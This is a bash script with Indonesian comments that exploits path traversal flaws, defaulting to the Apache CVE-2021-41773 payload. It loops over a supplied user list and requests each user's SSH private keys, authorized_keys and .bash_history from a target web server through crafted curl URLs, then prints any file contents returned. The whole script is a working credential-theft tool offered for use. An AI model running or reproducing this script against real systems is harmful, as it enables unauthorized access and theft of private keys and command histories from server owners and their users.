#!/bin/bash

# Default Path Traversal Payload (bisa disesuaikan via argumen)
# Contoh default: Payload Apache CVE-2021-41773
DEFAULT_PAYLOAD="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e"

TARGET_URL="$1"
USER_FILE="$2"
PAYLOAD="${3:-$DEFAULT_PAYLOAD}"

if [[ -z "$TARGET_URL" || -z "$USER_FILE" ]]; then
  echo "Usage: $0 <TARGET_URL> <USER_LIST_FILE> [TRAVERSAL_PAYLOAD]"
  echo "Example:"
  echo "  $0 http://192.168.122.245:8000 users.txt"
  echo "  $0 http://target.com/vuln.php?file= users.txt \"../../../../\""
  exit 1
fi

if [[ ! -f "$USER_FILE" ]]; then
  echo "[-] File user '$USER_FILE' tidak ditemukan!"
  exit 1
fi

# Daftar file sensitif/SSH key yang ingin ditargetkan
FILE_PATTERNS=(
  ".ssh/id_rsa"
  ".ssh/id_dsa"
  ".ssh/id_ecdsa"
  ".ssh/id_ed25519"
  ".ssh/authorized_keys"
  ".bash_history"
)

# Bersihkan trailing slash pada URL
TARGET_URL="${TARGET_URL%/}"

echo "[+] Starting Path Traversal Enumeration..."
echo "[+] Target  : $TARGET_URL"
echo "[+] Payload : $PAYLOAD"
echo "--------------------------------------------------"

while IFS= read -r user || [[ -n "$user" ]]; do
  # Skip baris kosong
  [[ -z "$user" ]] && continue

  # Tentukan home directory
  if [[ "$user" == "root" ]]; then
    user_dir="/root"
  else
    user_dir="/home/$user"
  fi

  for pattern in "${FILE_PATTERNS[@]}"; do
    target_path="${user_dir}/${pattern}"
    
    # Konstruksi URL lengkap
    full_url="${TARGET_URL}${PAYLOAD}${target_path}"

    # Eksekusi curl
    res=$(curl -s --path-as-is "$full_url")

    # Validasi output (bukan 404, tidak kosong, dan tidak merespons halaman error standar)
    if [[ ! "$res" =~ "404 Not Found" ]] && [[ ! "$res" =~ "<html>" ]] && [[ -n "$res" ]]; then
      echo -e "\n[\033[32m+\033[0m] FOUND ($user -> $pattern): $full_url"
      echo "--------------------------------------------------"
      echo "$res"
      echo "--------------------------------------------------"
    fi
  done
done < "$USER_FILE"
